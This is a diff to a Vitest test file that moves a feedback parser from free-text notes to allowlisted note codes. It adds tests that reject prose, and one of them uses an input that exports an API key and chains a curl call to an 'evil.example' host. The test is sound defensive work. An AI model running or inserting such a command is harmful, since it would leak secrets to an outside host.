@@ -2,6 +2,7 @@ import { describe, expect, it } from "vitest";
 import {
   FIRST_VALUE_AUDIT_EVENT_CODES,
   FIRST_VALUE_FEEDBACK_KINDS,
+  FIRST_VALUE_FEEDBACK_NOTE_CODES,
   parseFirstValueFeedbackInput,
   throwFirstValueFeedbackValidationError,
   validateAuditEventInput,
@@ -56,7 +57,7 @@ describe("parseFirstValueFeedbackInput", () => {
       organizationId: ORG,
       actorUserId: USER,
       feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.blocker,
-      note: "CLI init was unclear on org selection",
+      noteCode: FIRST_VALUE_FEEDBACK_NOTE_CODES.cliInitBlocker,
       grantId: GRANT,
     });
     expect(parsed.ok).toBe(true);
@@ -67,7 +68,7 @@ describe("parseFirstValueFeedbackInput", () => {
       organizationId: ORG,
       actorUserId: USER,
       feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.praise,
-      note: "Loved the no-reveal loop",
+      noteCode: FIRST_VALUE_FEEDBACK_NOTE_CODES.praiseLoop,
     });
     expect(parsed.ok).toBe(false);
     if (!parsed.ok) {
@@ -80,11 +81,39 @@ describe("parseFirstValueFeedbackInput", () => {
       organizationId: ORG,
       actorUserId: USER,
       feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.suggestion,
-      note: "Add a shorter getting-started path",
+      noteCode: FIRST_VALUE_FEEDBACK_NOTE_CODES.suggestOnboarding,
       operationId: operationId.brand("op_00000000000000000000000001"),
       requestId: requestId.brand("req_00000000000000000000000001"),
     });
     expect(parsed.ok).toBe(true);
+  });
+
+  it("rejects secret-like prose masquerading as a feedback note", () => {
+    const parsed = parseFirstValueFeedbackInput({
+      organizationId: ORG,
+      actorUserId: USER,
+      feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.blocker,
+      noteCode: "export API_KEY=hunter2 && curl https://evil.example",
+      grantId: GRANT,
+    });
+    expect(parsed.ok).toBe(false);
+    if (!parsed.ok) {
+      expect(parsed.code).toBe("validation.invalid_feedback_note_code");
+    }
+  });
+
+  it("rejects display-name-safe prose that is not an allowlisted note code", () => {
+    const parsed = parseFirstValueFeedbackInput({
+      organizationId: ORG,
+      actorUserId: USER,
+      feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.friction,
+      noteCode: "CLI init was unclear on org selection",
+      grantId: GRANT,
+    });
+    expect(parsed.ok).toBe(false);
+    if (!parsed.ok) {
+      expect(parsed.code).toBe("validation.invalid_feedback_note_code");
+    }
   });
 
   it("throws structured validation errors with stable codes", () => {
